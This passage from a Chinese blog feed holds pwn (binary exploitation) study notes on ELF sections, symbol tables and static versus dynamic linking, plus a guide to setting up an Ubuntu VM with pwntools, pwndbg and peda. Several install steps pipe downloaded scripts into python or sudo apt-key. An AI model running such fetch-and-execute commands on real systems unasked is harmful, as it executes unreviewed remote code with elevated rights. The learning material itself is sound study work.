已经编译但是而为编译的文件（.o）。所以下面所有称为目标文件的都是指各种类型的ELF文件，而对于”.o“ 文件。则直接称它为 可重定位文件。 由于这类文件包含了代码和数据，可以用于链接成可执行文件或共享目标文件，所以对于分析ELF文件的格式是非常好的。</p></blockquote><h3 id="2-ELF文件的结构"><a href="#2-ELF文件的结构" class="headerlink" title="2. ELF文件的结构"></a>2. ELF文件的结构</h3><p>在审视一个ELF文件时有两种视角可供选择：一是链接视角（即没有运行时的程序），它主要是通过节（Section）来进行划分；二是运行视角（即程序运行时的视角），它主要是通过段（Segment）来进行划分。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122183645182.png" alt="image-20220122183645182"></p><h4 id="2-1：链接时的ELF文件"><a href="#2-1：链接时的ELF文件" class="headerlink" title="2.1：链接时的ELF文件"></a>2.1：链接时的ELF文件</h4><p>从链接视角看：它主要是由文件头(ELF Header)、程序头、节头(Section Header)表、符号表( Symbol Table)、动态符号表(Dynamic Symbol Table)等组成。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220121170644802.png" alt="image-20220121170644802"></p><h5 id="（1）ELF文件头"><a href="#（1）ELF文件头" class="headerlink" title="（1）ELF文件头"></a>（1）ELF文件头</h5><p>​位于目标文件最开始的位置，包含描述整个文件的一些基本信息。例如：ELF文件类型、版本&#x2F;ABI版本、目标机器、程序入口、段表和节表的位置和长度等。它的存在主要是给操作系统看的，操作系统通过分析这个头表为ELF文件建立一个进程意向</p><blockquote><p>注意：文件头部存在魔术字符（7f 45 4c 46），即字符串”\77ELF”，当文件被映射到内存时，可以通过搜索该字符串确定映射地址，这在dump内存时非常有用</p></blockquote><p>此时可通过readelf命令查看文件头的一些信息：</p><pre><code class="bash">readelf -h test.o</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123150431243.png" alt="image-20220123150431243"></p><h5 id="（2）程序头"><a href="#（2）程序头" class="headerlink" title="（2）程序头"></a>（2）程序头</h5><p>在可重定位文件中没有程序头，它主要是存在于可执行文件中和共享目标文件</p><h5 id="（3）节头表"><a href="#（3）节头表" class="headerlink" title="（3）节头表"></a>（3）节头表</h5><blockquote><p>一个目标文件中包含许多节， 这些节的信息保存在节头表中。节头表对于程序的运行并不是必须的，因为它与程序内存布局无关，是程序头表的任务。所以常有程序去除节头表，以增加反汇编器的分析难度</p><p>记录了节点的名字、长度、便宜、读写权限等信息</p></blockquote><p>通过readelf命令可以查看程序的节头表信息</p><pre><code class="bash">readelf -S test.o</code></pre><pre><code class="bash">muggle@muggle-virtual-machine:~/Desktop/test2$ readelf -S a.out There are 29 section headers, starting at offset 0x1928:节头：  [号] 名称              类型             地址              偏移量       大小              全体大小          旗标   链接   信息   对齐  [ 0]                   NULL             0000000000000000  00000000       0000000000000000  0000000000000000           0     0     0  [ 1] .interp           PROGBITS         0000000000000238  00000238       000000000000001c  0000000000000000   A       0     0     1  [ 2] .note.ABI-tag     NOTE             0000000000000254  00000254       0000000000000020  0000000000000000   A       0     0     4  [ 3] .note.gnu.build-i NOTE             0000000000000274  00000274       0000000000000024  0000000000000000   A       0     0     4  [ 4] .gnu.hash         GNU_HASH         0000000000000298  00000298       000000000000001c  0000000000000000   A       5     0     8  [ 5] .dynsym           DYNSYM           00000000000002b8  000002b8       00000000000000a8  0000000000000018   A       6     1     8  [ 6] .dynstr           STRTAB           0000000000000360  00000360       0000000000000082  0000000000000000   A       0     0     1  [ 7] .gnu.version      VERSYM           00000000000003e2  000003e2       000000000000000e  0000000000000002   A       5     0     2  [ 8] .gnu.version_r    VERNEED          00000000000003f0  000003f0       0000000000000020  0000000000000000   A       6     1     8  [ 9] .rela.dyn         RELA             0000000000000410  00000410       00000000000000c0  0000000000000018   A       5     0     8  [10] .rela.plt         RELA             00000000000004d0  000004d0       0000000000000018  0000000000000018  AI       5    22     8  [11] .init             PROGBITS         00000000000004e8  000004e8       0000000000000017  0000000000000000  AX       0     0     4  [12] .plt              PROGBITS         0000000000000500  00000500       0000000000000020  0000000000000010  AX       0     0     16  [13] .plt.got          PROGBITS         0000000000000520  00000520       0000000000000008  0000000000000008  AX       0     0     8  [14] .text             PROGBITS         0000000000000530  00000530       00000000000001a2  0000000000000000  AX       0     0     16  [15] .fini             PROGBITS         00000000000006d4  000006d4       0000000000000009  0000000000000000  AX       0     0     4  [16] .rodata           PROGBITS         00000000000006e0  000006e0       0000000000000010  0000000000000000   A       0     0     4  [17] .eh_frame_hdr     PROGBITS         00000000000006f0  000006f0       000000000000003c  0000000000000000   A       0     0     4  [18] .eh_frame         PROGBITS         0000000000000730  00000730       0000000000000108  0000000000000000   A       0     0     8  [19] .init_array       INIT_ARRAY       0000000000200db8  00000db8       0000000000000008  0000000000000008  WA       0     0     8  [20] .fini_array       FINI_ARRAY       0000000000200dc0  00000dc0       0000000000000008  0000000000000008  WA       0     0     8  [21] .dynamic          DYNAMIC          0000000000200dc8  00000dc8       00000000000001f0  0000000000000010  WA       6     0     8  [22] .got              PROGBITS         0000000000200fb8  00000fb8       0000000000000048  0000000000000008  WA       0     0     8  [23] .data             PROGBITS         0000000000201000  00001000       0000000000000010  0000000000000000  WA       0     0     8  [24] .bss              NOBITS           0000000000201010  00001010       0000000000000008  0000000000000000  WA       0     0     1  [25] .comment          PROGBITS         0000000000000000  00001010       0000000000000029  0000000000000001  MS       0     0     1  [26] .symtab           SYMTAB           0000000000000000  00001040       00000000000005e8  0000000000000018          27    43     8  [27] .strtab           STRTAB           0000000000000000  00001628       0000000000000202  0000000000000000           0     0     1  [28] .shstrtab         STRTAB           0000000000000000  0000182a       00000000000000fe  0000000000000000           0     0     1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),  L (link order), O (extra OS processing required), G (group), T (TLS),  C (compressed), x (unknown), o (OS specific), E (exclude),  l (large), p (processor specific)</code></pre><p>可以发现在节头表存储的是一些节，主要有：bss节、text节、.got.Plt表、data节、plt节等等，每一个节都有自己特定的功能</p><blockquote><p><strong>.bss段</strong>：bss段（Block by symbols）属于静态内存分配通常是用来存放程序中 未初始化的全局变量的一块内存区域</p><p><strong>.data段</strong>：属于静态内存分配，通常是用来存放已初始化的全局变量的一块内存区域。</p><p><strong>.text段</strong>： 通常是指用来存放程序执行代码的一块内存区域，这部分区域的大小在程序运行时就已经确定，并且内存区域通常属于只读（显然是不允许用户修改代码的）</p><p><strong>.plt</strong>：包含了动态链接器调用从共享库导入的函数必需的相关的代码</p><p><strong>.got.plt</strong>：全局偏移表，用于保存了全局变量引用的地址，got表就位于该节（这里用到了got表的劫持）</p><p><strong>.rodata</strong>：字符串</p><p><strong>.got</strong>： 全局偏移量表，用于保存全局变量引用的地址</p></blockquote><p>下面通过objdump命令来具体的分析一下程序节头区里面的 .text（代码）节、.data（数据节）、.bss（BSS）节</p><pre><code class="bash">objdump -xsd test.o</code></pre><p>参数说明：</p><blockquote><p><code>-x</code> ：显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 </p><p><code>-s</code> ：显示目标文件的全部Header信息和他们对应的十六进制文件代码  </p><p><code>-d</code> ：对目标文件进行反汇编 </p><p>由于test.o的文件未进行链接，可能对于分析节头区更加方便</p></blockquote><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124171012103.png" alt="image-20220124171012103"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124170941822.png" alt="image-20220124170941822"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220124170925272.png" alt="image-20220124170925272"></p><p>a. 首先查看程序的代码节：</p><pre><code class="bash">节：Idx Name          Size      VMA               LMA               File off  Algn  0 .text         00000027  0000000000000000  0000000000000000  00000040  2**0                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODEContents of section .text: 0000 554889e5 4883ec10 897dfc48 8975f048  UH..H....&#125;.H.u.H 0010 8d3d0000 0000b800 000000e8 00000000  .=.............. 0020 b8000000 00c9c3                      .......         Disassembly of section .text:0000000000000000 &lt;main&gt;:   0:55                   push   %rbp   1:48 89 e5             mov    %rsp,%rbp   4:48 83 ec 10          sub    $0x10,%rsp   8:89 7d fc             mov    %edi,-0x4(%rbp)   b:48 89 75 f0          mov    %rsi,-0x10(%rbp)   f:48 8d 3d 00 00 00 00 lea    0x0(%rip),%rdi        # 16 &lt;main+0x16&gt;            12: R_X86_64_PC32.rodata-0x4  16:b8 00 00 00 00       mov    $0x0,%eax  1b:e8 00 00 00 00       callq  20 &lt;main+0x20&gt;            1c: R_X86_64_PLT32printf-0x4  20:b8 00 00 00 00       mov    $0x0,%eax  25:c9                   leaveq   26:c3                   retq   </code></pre><blockquote><p>可以看到Contents of section.text部分是.text数据以十六进制的形式展示，共有十个字节，其中最左边一列是偏移量，中间四列是内容，最左边一列是ASCII码形式。而 Disassembly of section .text 是反汇编以后的结果</p></blockquote><p>b. 然后查看程序的数据节和只读数据节</p><pre><code class="bash">节：Idx Name          Size      VMA               LMA               File off  Algn 1 .data         00000000  0000000000000000  0000000000000000  00000067  2**0                 CONTENTS, ALLOC, LOAD, DATA 3 .rodata       0000000b  0000000000000000  0000000000000000  00000067  2**0                  CONTENTS, ALLOC, LOAD, READONLY, DATAContents of section .rodata: 0000 48656c6c 6f20776f 726400             Hello word.     </code></pre><blockquote><ul><li><p>可以看到.data保存已经初始化的全局变量和局部变量静态</p></li><li><p>.radata节：保存了只读数据，包括只读变量和字符串常量。源代码中调用printf函数时，用到了一个字符串，它是只读数据包，因此保存在.rodata节当中，而且字符串是以ASCII形式展示的</p></li></ul></blockquote><p>c. 最后看.bss节</p><pre><code class="bash">节：Idx Name          Size      VMA               LMA               File off  Algn 2 .bss          00000000  0000000000000000  0000000000000000  00000067  2**0                  ALLOC</code></pre><blockquote><p>用于保存未初始化的全局变量和局部静态变量。此时还可以发现该节段没有CONTENTS属性。这表示该节在文件中实际并不存在，只是为变量预留了位置而已。</p></blockquote><h5 id="（4）符号表"><a href="#（4）符号表" class="headerlink" title="（4）符号表"></a>（4）符号表</h5><blockquote><p>符号表记录了目标文件中所用到的所有符号信息，定义的符号 。通常分为 .dynsym 和 .symtab </p><p>① dynsym 是 .symtab的子集</p><p>② .dynsym  保存了引用外部文件的符号，只能在运行是被解析</p><p>③ .symtab 除了dynsym 的功能，还保存本地符号， 用于调试和链接</p></blockquote><blockquote><p>目标文件通过一个符号在表中的索引值来使用该符号。索引值从0开始计数，但是值为0 的表项不具有实际的意义， 它表示未定义的符号。每一个符号都有一个符号， 对于变量和函数，该值就是符号的地址 </p></blockquote><p>重定位：</p><blockquote><p>重定位是连接符号定义与符号引用的过程。可重定位文件在构建可执行文件或共享目标文件时， 需要把节点的符号引用换成这些符号在进程空间中的虚拟地址。</p><p>包含这些转换信息的数据就是重定位项。 </p></blockquote><h4 id="2-2：运行时的ELF文件"><a href="#2-2：运行时的ELF文件" class="headerlink" title="2.2：运行时的ELF文件"></a>2.2：运行时的ELF文件</h4><p>下面成运行的视角来审视ELF文件。</p><p>当运行一个可执行文件时，首先要将文件和动态链接库装载到进程空间中，形成一个进程镜像。每个进程都拥有独立的虚拟地址空间，这个空间如何布局是由记录在段头表中的程序表来决定的。</p><p>打开gdb调试页面。查看内存。你主要看到的是code（代码段）、Data（数据段）、stack（栈）、heap（堆）</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122210013530.png" alt="image-20220122210013530"></p><blockquote><p>.data.bss.got.plt&#x3D;&#x3D;》数据data段、这些机械码在执行中所用到的相关的数据</p><p>.rodata.text.initELF header&#x3D;&#x3D;》code代码段（不可写的）、、cpu认的机械码</p><p>stack：用来管理里面函数调用的状态</p><p>heap：用来给用户提供内存，动态内存申请的调用</p><p>比如：malloc一大块内存,在大块内存里面放一个图片，这个图片并没有写死在这个可执行文件里面的，所以只能在内存的进制空间里面再开辟一块内存，在heap里面提供给用户的malloc的内存，再heap里面存放图片。图片同样在内存的可执行文件的对应的虚拟内存空间当中，但是并不存在在磁盘的可执行文件当中</p></blockquote><blockquote><p>gdb：低地址往高地址写，出于写数据的原因，gdb的低地址在上面</p></blockquote><h2 id="三、-静态链接与动态链接"><a href="#三、-静态链接与动态链接" class="headerlink" title="三、 静态链接与动态链接"></a>三、 静态链接与动态链接</h2><blockquote><p>链接：主要就是通过链接器将两个或者是多个不同的目标文件组合成一个可执行文件。然后根据时间不同又可分为：编译时链接、加载时链接和运行时链接</p></blockquote><h3 id="1-静态链接"><a href="#1-静态链接" class="headerlink" title="1. 静态链接"></a>1. 静态链接</h3><p>由于静态链接存在的一些缺陷以及当前默认是动态链接的，所以对于静态链接的方式我只是做个了解。不过如果pwn中出现的题目是用静态链接的方式链接的，而且程序的溢出大小很大，那么就可能通过特殊的方法一键获取flag</p><p>下面存在两个C语言文件来简单实现一下程序之间是如何链接的</p><p>main.c</p><pre><code class="c">#include&lt;stdio.h&gt;extern int shared;extern void func(int *a, int *b);int main(int argc, char const *argv[])&#123;    int a = 100;     func(&amp;a, &amp;shared);    return 0;&#125;</code></pre><p>func.c</p><pre><code class="c">#include&lt;stdio.h&gt;int shared = 1;int tmp = 0;void func(int *a, int *b)&#123;    tmp = *a;    *a = *b;    *b = tmp;&#125;</code></pre><p>通过gcc编译将两个目标文件链接成一个可执行文件</p><pre><code class="bash">gcc -static -fno-stack-protector main.c func.c -save-temps --verbos -o func.elf</code></pre><p>最终可以得到这么多文件</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123204406602.png" alt="image-20220123204406602"></p><p>链接方式主要有两种</p><p>第一种方法：按序叠加</p><blockquote><p>就是按照程序的执行顺序进行叠加在一起。比如先执行，main.o源代码，从文件头-&gt;text-&gt;.data-&gt;.bss  &#x3D;&#x3D;》func.o</p><p>这种方法的弊端：</p><p>① 参与的链接的目标文件过多，那么输出的可执行文件会非常零散。</p><p>② 段的装载地址和空间以页为单位，不足一页的代码节或数据节也要站一页，造成内存空间的浪费</p></blockquote><p>第二种方法：相似节合并</p><blockquote><p>将不同目标文件的相同属性的节合并为一个节，如将main.o和func.o的text节合并为新的.text节。</p><p>方式：先对各个节的长度、属性和偏移进行分析，然后将输入目标文件中符号表的符号定于i与符号引用同意生成全局符号表，最后读取输入文件的各类信息对符号进行解析、重定位等操作。相似节的合并就发生在重定位时。完成后，程序中的每条指令和全局变量就有唯一的运行内存地址了</p></blockquote><h3 id="2-动态链接"><a href="#2-动态链接" class="headerlink" title="2. 动态链接"></a>2. 动态链接</h3><p>由于静态链接是直接把需要的代码直接链接上去，显然对于内存是一种负担。于是就出现了动态链接</p><blockquote><p>动态链接：在运行或者是加载时，在内存完成链接的过程。 </p><p>&#x3D;&#x3D;》 把系统库和自己编写的代码分割成两个独立的模块，等到程序真正运行时，再把两个模块进行连接。</p></blockquote><p>那么对于上面的两个源代码如何采取动态链接的方式的呢？</p><blockquote><p>首先要将func.c这个代码编译成共享库文件，然后使用这个库编译main.c。</p></blockquote><pre><code class="bash">gcc -shared fpic -o func.so gcc -fno-stack-protector -o func.elf2 main.c ./func.so</code></pre><p>参数说明：</p><blockquote><p>-shared：表示生成共享库</p><p>-fpic： 表示生成与位置无关的代码</p><p>这样可执行文件func.elf2 就会在在加载时与func.so进行动态链接</p></blockquote><p>注意：</p><blockquote><p>动态加载器ld-Linux.so本身就是一个共享库，因此加载器会加载并运行动态加载器， 并由加载器来完成其他共享库以及符号的重定位</p></blockquote><p>通过ldd查看此时的ELF文件， 可以发现此时的文件已经链接好了 func.so库了， 除此之外还有一个ld-linux.so库</p><pre><code class="bash">ldd func.elf2</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123225340638.png" alt="image-20220123225340638"></p><p>用objdump查看汇编代码</p><pre><code class="bash">objdump -d -M intel --section=.text func.elf2 |grep -A 11 &quot;&lt;main&gt;&quot;</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123225445427.png" alt="image-20220123225445427"></p><p>可以发现自己制作的func.so动态链接库已经被链接成功了</p><p>说明：</p><blockquote><p>一个程序（或者是共享库）的数据段和代码段的相对距离总是保持不变的</p><p>​⬇⬇⬇⬇⬇⬇⬇⬇⬇</p><p>指令和变量之间的距离是一个运行时常量，与绝对内存地址无关。</p><p>​⬇⬇⬇⬇⬇⬇⬇⬇⬇</p><p>于是就有了全局偏移表（GOT），它位于数据段的开头，用于保存全局变量和库函数的作用，每个条目占8个字节，在加载是会进行重定位并重写符号的绝对地址、</p></blockquote><p>实际上</p><blockquote><p>为了引入：RELRO保护机制，GOT表被拆分为 .got节 和  .got.plt  节两个部分，</p><p>.got节： 不需要延迟绑定， 用于保存全局变量引用，加载到内存后标记为只读</p><p>.got.plt节：需要延迟绑定， 用于保存函数引用，具有读写权限</p></blockquote><p>查看func.so的情况</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123230528845.png" alt="image-20220123230528845"></p><p>可以发现：</p><p>全局变量位于 GOT上， R_X86_64_GLOB_DAT表示需要动态链接器找到tmp的值并填充到0x200fd8。</p><p>在func（）函数需要取出tmp是，计算符号相对于PC的便宜 rip + 0x20090， 也就是 0x6c9 + rip+0x2008a5z&#x3D; 0x200fd8</p><p>rip+0x2008a5</p>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-环境配置</title>
      <link href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出（1-3）-基础知识-环境配置"><a href="#栈溢出（1-3）-基础知识-环境配置" class="headerlink" title="栈溢出（1-3）-基础知识-环境配置"></a>栈溢出（1-3）-基础知识-环境配置</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下面包含的是pwn做题时用到的一些环境和工具，注意：一定安装每一步骤过来，一旦中间有一步省略就会报错。</p><p>当前的版本为Ubuntu16</p><h2 id="一、安装虚拟机"><a href="#一、安装虚拟机" class="headerlink" title="一、安装虚拟机"></a>一、安装虚拟机</h2><p>前提条件：下载VMware，输入密钥、下载你想要安装版本的iso镜像文件</p><p>（1）配置一些信息</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220515163157362.png" alt="image-20220515163157362"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220515163108240.png" alt="image-20220515163108240"></p><p>（2）选择版本，最好选择Ubuntu 64位的</p><p>（3）然后选择存储位置，最好单独开一个盘，不要选择C盘，除非你的内存很大。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220515163315397.png" alt="image-20220515163315397"></p><p>（4）确定以后，再点击编辑虚拟机设置</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126105123191.png" alt="image-20211126105123191"></p><p>（5）接下来，打开该虚拟机</p><h2 id="二、安装linux必备的环境"><a href="#二、安装linux必备的环境" class="headerlink" title="二、安装linux必备的环境"></a>二、安装linux必备的环境</h2><h3 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h3><p>熟练基本的linux基本命令，可以参考：<a href="https://www.bilibili.com/video/BV1ex411x7Em">https://www.bilibili.com/video/BV1ex411x7Em</a> 的命令，重点掌握前40节的命令，其余的了解即可</p><h3 id="1-将中文目录（如桌面）改成英文目录"><a href="#1-将中文目录（如桌面）改成英文目录" class="headerlink" title="1.将中文目录（如桌面）改成英文目录"></a>1.将中文目录（如桌面）改成英文目录</h3><p>先改目录名称（要注意：此时不能从主机里复制内容，这个需要安装VMware-tools才能）</p><p>最开始进去的目录名称是中文，需要改成英文，这样更方便。</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126105208612.png" alt="image-20211126105208612"></p><p>在终端输入命令：</p><pre><code class="c">export LANG=en_USxdg-user-dirs-gtk-update</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220515163405132.png" alt="image-20220515163405132"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126105259756.png" alt="image-20211126105259756"></p><pre><code>export LANG=zh_CN.UTF-8</code></pre><h3 id="2-安装VMware-tools"><a href="#2-安装VMware-tools" class="headerlink" title="2.安装VMware-tools"></a>2.安装VMware-tools</h3><p>好处：作用很多，自习百度了解</p><p>（1）左上角 &#x3D;&#x3D;》虚拟机 &#x3D;&#x3D;》安装VMware-tools</p><p>会弹出下面的DVD的文件夹，提取到你想要提取的位置</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220515163524220.png" alt="image-20220515163524220"></p><p>（2）接下来进入这个目录，运行下面的语句</p><pre><code class="shell">sudo ./install.pl</code></pre><p>之后运行这个程序以后就是按照提示输入yes、回车就可以安装成功</p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><blockquote><p>如果是Ubuntu20的话它会自动安装VMwaretools。但是此时如果你想设置共享文件夹就会发现当你每次重启虚拟机时就无法再次使用该共享文件夹。此时就需要你重新安装vmtool， 跟前面的安装方式一样，你需要自行下载vmtools，并且全部输入yes</p></blockquote><h3 id="3-更新清华源"><a href="#3-更新清华源" class="headerlink" title="3.更新清华源"></a>3.更新清华源</h3><h4 id="（1）方式一："><a href="#（1）方式一：" class="headerlink" title="（1）方式一："></a>（1）方式一：</h4><p>（1）先备份</p><pre><code>cd /etc/aptsudo  cp sources.list ~/Desktop/sources.list.bak</code></pre><p>（2）替换</p><p>前往  <a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a>  找到你的版本，复制</p><p>输入下列命令，然后将复制的直接粘贴进去，再保存</p><pre><code>sudo gedit sources.list    </code></pre><p>（3）更新源文件</p><pre><code>更新清华源sudo apt-get update更新软件源sudo apt-get  upgrade </code></pre><p>可能会报错，自行访问<a href="https://blog.csdn.net/weixin_45556441/article/details/118306506">https://blog.csdn.net/weixin_45556441/article/details/118306506</a></p><h4 id="（2）方式二"><a href="#（2）方式二" class="headerlink" title="（2）方式二"></a>（2）方式二</h4><p>点击软件管理器当中的设置，然后在Ubuntu软件里面设置一下镜像源</p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220515162714680.png" alt="image-20220515162714680" style="zoom: 150%;" /><h3 id="4-更新操作"><a href="#4-更新操作" class="headerlink" title="4. 更新操作"></a>4. 更新操作</h3><pre><code class="shell">sudo apt-get update  //更新软件源sudo apt-get upgrade   // 更新升级所有软件</code></pre><h3 id="5-安装编辑器"><a href="#5-安装编辑器" class="headerlink" title="5.安装编辑器"></a>5.安装编辑器</h3><h4 id="（1）安装vim"><a href="#（1）安装vim" class="headerlink" title="（1）安装vim"></a>（1）安装vim</h4><pre><code>sudo apt install vim</code></pre><p>vim是一款自带的编辑器，有点麻烦的是你需要掌握一些基本的语法</p><p><strong>要求：掌握vim基本语法</strong></p><h4 id="（2）安装sublime"><a href="#（2）安装sublime" class="headerlink" title="（2）安装sublime"></a>（2）安装sublime</h4><pre><code class="shell">sudo apt install curlsudo apt updatesudo apt install dirmngr gnupg apt-transport-https ca-certificates software-properties-commoncurl -fsSL https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -sudo add-apt-repository &quot;deb https://download.sublimetext.com/ apt/stable/&quot;sudo apt updatesudo apt install sublime-text</code></pre><p>等待1~2分钟即可</p><p>验证subl +文件名</p><p>更改sublime菜单栏成中文</p><p>①  使用快捷键 Shift+Ctrl+P 弹出查询栏</p><p>② 在搜索框中输入关键字 install，然后点击  install Package Control。会弹出一个消息框</p><p>③在菜单栏中选择Preferences &#x3D;&#x3D;》Package Contorol &#x3D;&#x3D;》输入install package，选择第一个</p><p>④ 之后会弹出一个窗口，输入chinese，选择插件ChineseLocaloztions点击安装。</p><p>⑤ 出现中文字体说明安装好了。在help &#x3D;&#x3D;》 Language中可自由切换</p><p>⑥接下来自己配置自己喜欢的方式。</p><p><br><br></p><h3 id="5-小技巧"><a href="#5-小技巧" class="headerlink" title="5.小技巧"></a>5.小技巧</h3><p>（1）如果你需要修改@后面的主机名：</p><pre><code>sudo vim /etc/hostname （输入你想要改的名字）sudo vim /etc/hosts(将里面的127.0.1.1       你上一步改的名字)</code></pre><p>然后重启即可</p><p>（2）对于shell的一些布局的控制均在</p><h2 id="三、安装pwn环境（Ubuntu16）"><a href="#三、安装pwn环境（Ubuntu16）" class="headerlink" title="三、安装pwn环境（Ubuntu16）"></a>三、安装pwn环境（Ubuntu16）</h2><h3 id="1：安装pwntools"><a href="#1：安装pwntools" class="headerlink" title="1：安装pwntools"></a>1：安装pwntools</h3><p>要求：掌握pwntools的作用、以及基本的语法，pwntools是一个ctf框架和漏洞利用开发库，用Python开发，目的是更快的写exp脚本。<br>参考：<a href="https://www.yuque.com/cyberangel/rg9gdm/uqazzg">https://www.yuque.com/cyberangel/rg9gdm/uqazzg</a></p><h4 id="（1）-python2-安装pwntools库"><a href="#（1）-python2-安装pwntools库" class="headerlink" title="（1） python2 安装pwntools库"></a>（1） python2 安装pwntools库</h4><p>注意：Ubuntu对于python2的已经停止更新，python2安装pwntools库相对也比较麻烦，所以尽量用python3来安装</p><p>① 设置python2为默认的python（Ubuntu16好像默认就是python2）</p><pre><code class="shell">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 1sudo update-alternatives --list python</code></pre><p> ② 安装pip</p><pre><code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.pysudo python get-pip.py</code></pre><p>④ 安装pwntools</p><pre><code>git clone https://github.com/aquynh/capstonecd capstonemakemake install</code></pre><pre><code>git clone https://github.com/Gallopsled/pwntoolscd pwntoolspython setup.py install</code></pre><h4 id="（2）-python3-安装pwntools库"><a href="#（2）-python3-安装pwntools库" class="headerlink" title="（2） python3 安装pwntools库"></a>（2） python3 安装pwntools库</h4><p>① 安装pip3（Ubuntu20不需要）</p><pre><code>①先安装pip3sudo apt install python3-pip②再更新pip3（如果报错安装下面的操作）sudo pip3 install --upgrade pip③如果查看pipi3版本报错（pip -V），没报错就不用执行下面命令curl -fsSL -o- https://bootstrap.pypa.io/pip/3.5/get-pip.py | python3.5</code></pre><p>②   安装pwntools</p><pre><code>sudo apt updatesudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -ypython3 -m pip install --upgrade pip pip3 install --upgrade pwntools</code></pre><br><h3 id="2：安装one-gadget"><a href="#2：安装one-gadget" class="headerlink" title="2：安装one_gadget"></a>2：安装one_gadget</h3><pre><code>sudo apt -y install rubysudo gem install one_gadget</code></pre><h3 id="3：安装gdb插件"><a href="#3：安装gdb插件" class="headerlink" title="3：安装gdb插件"></a>3：安装gdb插件</h3><p>要求：要求掌握gdb的动态调式功能（动态调式将一直伴随你做题）</p><h4 id="（1）安装pwndbg"><a href="#（1）安装pwndbg" class="headerlink" title="（1）安装pwndbg"></a>（1）安装pwndbg</h4><pre><code>① git clone https://github.com/pwndbg/pwndbg.git如果存在问题将 https改成git② cd pwndbg③ ./setup.sh</code></pre><p>查看是否安装完成</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126105409935.png" alt="image-20211126105409935"></p><h4 id="（2）安装peda"><a href="#（2）安装peda" class="headerlink" title="（2）安装peda"></a>（2）安装peda</h4><pre><code>git clone https://github.com/longld/peda.git ~/peda</code></pre><h4 id="（3）pwndbg与peda插件的切换"><a href="#（3）pwndbg与peda插件的切换" class="headerlink" title="（3）pwndbg与peda插件的切换"></a>（3）pwndbg与peda插件的切换</h4><pre><code>① 命令行输入：vim ~/.gdbinit②往文件中中输入下面内容source ~/peda/peda.py③你想要用哪个，就用#注释掉另外一个注意：如果你不会使用vim编辑器，就用sublime编辑器。不过记得要保存。</code></pre><p><br><br></p><h3 id="4：设置共享文件夹"><a href="#4：设置共享文件夹" class="headerlink" title="4：设置共享文件夹"></a>4：设置共享文件夹</h3><p>点击虚拟机 &#x3D;&#x3D;&gt; 选项 &#x3D;&#x3D;》共享文件夹&#x3D;&#x3D;》设置你想要共享的文件 &#x3D;&#x3D;》确定</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211126105427811.png" alt="image-20211126105427811"></p><p>此时在cd &#x2F;mnt&#x2F;hgfs&#x2F;（你设置文件夹的名字） 是已经存在了的</p><p>接下里就是将这个文件软链接到家目录</p><pre><code>①cd /mnt/hgfs② ln -s /mnt/hgfs/文件名/ ~/文件名</code></pre><p><a href="https://www.cnblogs.com/slyu/p/13362005.html">https://www.cnblogs.com/slyu/p/13362005.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础学习</title>
      <link href="/2022/07/12/Linux%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/12/Linux%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
